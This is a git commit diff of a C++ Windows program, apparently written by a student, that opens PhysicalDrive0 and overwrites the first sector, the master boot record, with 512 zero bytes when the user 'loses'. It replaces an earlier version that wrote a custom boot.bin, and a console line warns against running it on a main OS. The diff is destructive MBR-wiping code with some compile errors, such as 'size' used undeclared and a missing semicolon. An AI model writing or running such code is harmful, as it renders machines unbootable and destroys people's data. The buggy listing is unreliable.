9185a1d9b7e5e217c770ac9ce808fc9f72094b8b
nevembalint1 <87340443+nevembalint1@users.noreply.github.com>
2023-03-23 11:28:28 +0100

    Update Main.cpp
    revision 2.0 
    i made this change in class so it might not be perfect .
    Tryig to focus on class and code at the same time is hard xD

--- Main.cpp
+++ Main.cpp
@@ -7,7 +7,16 @@
 //i hate to put std:: before every std func so imma just use it as a namespace
 using namespace std;
 
+//he is 512 bytes of zeros to overwrite the MBR xDDDDDDDDD
+
+
 int main(){
+  // Declare an array of 512 bytes
+  unsigned char arr[512];
+  // Fill the array with zeros
+  std::memset(arr, 0, sizeof(arr));
+  size = sizeof(arr);
+  
   string TOS = "no"
   bool lost;
   cout << "THIS PROGRAM IS DANGEROUS PLS DONT USE IT ON YOUR MAIN OS" << endl;
@@ -39,28 +48,14 @@ int main(){
  if(lost == true){
     HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (drive == INVALID_HANDLE_VALUE) { printf("Error opening a handle to the drive."); return -1; }
-
-    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
-    if (binary == INVALID_HANDLE_VALUE) { printf("Error opening a handle to boot.bin"); return -1; }
-
-    DWORD size = GetFileSize(binary, 0);
-    if (size != 512) { printf("Error opening a handle to boot.bin"); return -1; }
-
-    byte* new_mbr = new byte[size];
+   
     DWORD bytes_read;
-    if(ReadFile(binary, new_mbr, size, &bytes_read, 0)) 
-    {
-        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
+   
+        if (WriteFile(drive, arr, size, &bytes_read, 0))
         {
             printf("First sector overritten successfuly!\n");
         }
-    }else 
-    {
-        printf("Error reading boot.bin\n");
-        printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'");
-    }
-
-    CloseHandle(binary);
+ 
     CloseHandle(drive);
     std::getchar();
     return 0;
